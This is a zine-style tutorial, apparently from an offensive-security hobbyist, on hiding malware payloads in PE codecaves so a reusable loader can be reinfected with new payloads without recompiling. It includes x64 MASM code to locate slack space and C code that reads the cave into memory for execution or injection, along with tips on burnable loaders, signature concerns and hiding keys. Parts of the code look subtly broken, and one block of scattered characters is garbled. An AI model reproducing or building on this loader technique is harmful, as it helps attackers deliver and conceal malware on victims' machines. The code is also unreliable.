@@ -1,0 +1,186 @@
+()()()()()()()()()()()()()()()()()()()()()()()()()()((((((((
+GUN: Abusing codecaves to hide and hot swap payloads||||||||
+()()()()()()()()()()()()()()()()()()()()()()()()()()))))))))
+
+Sleepy - 2025
+
+Ground Zero - On the cusp of .........0
+
+I have come across many times where, just to swap
+out a payload, I must recompile the entire program.
+This is Is pretty annoying, what if we could write
+a single loader and somehow swap out payloads.
+
+A thought came across my mind, codecaves. Codecaves
+or slack space is alignment space inside of a PE.
+This slack space serves 0 perpose other than keeping 
+section alignment. 
+
+|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|
+
+Sometimes I have found garbage data at this offset, 
+but the majority of the time it will be 0s.
+
+These Caves are going to be our storage container. 
+I am going to walk through getting codecaves and also
+walking through how to place data inside of it.
+
+Lets get into the ASM, I wrote this in x64 MASM
+
+CaveWalker:
+
+sectionWalk PROC
+
+    mov eax, dword ptr [rcx+3Ch]    ; elfanew
+    add rax, rcx                    ; rax = &IMAGE_NT_HEADERS
+
+    movzx r8d, word ptr [rax + 14h] ; sizeOfOptionalHeader
+    lea rdx, [rax + 18h]            ; start of optionalHeader 
+    add rdx, r8                     ; first section
+
+    ; rdx is first section
+    
+    mov cx, word ptr [rax + 6]      ; number of sections
+    movzx eax, cx                   ; section count in eax
+
+    xor r9d, r9d                    ; set to 0 for iteration        
+    loopSections:
+
+    cmp r9d, eax                    ; cmp to section count in eax
+    je equalExit                    ; exit
+
+    mov al, [rdx]
+    cmp al, '.'
+    je foundEntry                   ; if first 8 bits is . je cave finder
+
+    add rdx, 28h                    ; move to next section
+    inc r9d                         ; iterate num
+
+    jmp loopSections                ; Looping back through
+
+    equalExit:
+    mov rax, rdx                    ; exit 
+    ret
+
+    foundEntry:
+
+    mov al, [rdx+1]
+    cmp al, 'd'                     ; .data often has slack space
+    jne nextSection
+
+    mov r13, [rdx+10h]              ; rawSize
+    
+    mov rax, [rdx+8h]               ; misc.size
+
+    sub rax, r13                    ; misc.size - rawSize 
+
+    mov r14, [rdx+14h]              ; Pointer to raw data
+
+    add r14, r13                    ; add pointer to raw data + rawsize cave entry
+
+    mov rax, r14
+
+    ret
+    jmp equalExit
+
+    nextSection:
+    add rdx, 28h                   ; add rdx + sizeof(IMAGE_SECTION_HEADER)
+    inc r9d                        ; inc counter
+    jmp loopSections
+
+    sectionWalk ENDP
+    END
+
+    This code takes in a unsigned char* using the following
+    extern in C.
+    
+    ++++++++++++++++++++++++++++++++++++
+    extern int sectionWalk(BYTE* buff);+
+    ++++++++++++++++++++++++++++++++++++
+    
+    *               9           8               8           1
+            8           5               0               1
+  $        9          4                5            2
+  4         7                   5           j       
+  
+  
+  Passing in a Raw buffer into our sectionWalk function 
+  allows us to output an integer, this is our codecave
+  offset.
+  
+  Moving the file pointer to the location of the cave on 
+  disk and writing to it allows us to store code that will
+  not interfere with normal exection. 
+  
+  This left me with another thought, what if I were to make
+  an exe that would read its own slack space on disk and 
+  execute the raw bytes inside of a executable buffer.
+  
+  So I wrote a program that walks itself and executes the 
+  data it finds within its own cave.
+  
+  This is the flow:
+  
+  Infector writes to codecave
+                             \
+                              > exe walks its own codecave
+                                                          \
+                                                           > Call code inside of new exectuable buffer
+                                                           
+  One thing to keep in mind is that the code must fit within
+  this space. Meaning if you have a payload larger than the 
+  slack space, your going to have to get that payload down to 
+  a couple thousand bytes.
+  
+  This flow allows us to Infect our loader with a new payload
+  each time, overwriting the previous one.
+
+  C: My hearts real home =========================================
+
+    // path2File can be the 
+    FILE* file = fopen(path2File, "rb");        // might have to use CreateFile for shared reasons but this works
+
+    fseek(file, 0, SEEK_END);
+    int size = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    BYTE* fileBuff = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    fread(fileBuff, 1, size, file);
+
+    puts("About to walk sections");
+    int* nt = sectionWalk(fileBuff);    // finding codeCave
+
+    SetFilePointer(file, nt, NULL, FILE_BEGIN); // moving to cave
+
+    BYTE mem[4208];
+    ReadFile(file, mem, sizeof(mem), NULL, NULL);
+
+    // Now Execute either directly or by injection
+==================================================================
+
+  I imagine this code as a gun and without loading the proper
+  ammo into it, the loader will do nothing, a digital paperweight.
+  But, when armed with a payload inside its codecave, it wont
+  hesitate to call the entry point.
+  
+  |?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|?|
+  
+  Obviously from a signature standpoint, it is weak to reause the
+  same loader every time, but if you have a loader you dont care to 
+  burn, then I suggest using this method to hot swap payloads without
+  recompiling.
+  
+  Other than code this space is also great for storing keys or any 
+  other info you want to keep hidden.
+  
+  This slack space is ignored by the loader so nothing written to the
+  file will ever be present in memory when the exe is running, that 
+  is why we have to read the payload from disk. 
+  
+  oh... and one more thing, SEE YA!.
+
+  Written: Inside of a dream
+
+  follow your heart through a maze of bytes and youll come out on fire
+  
+  EOF
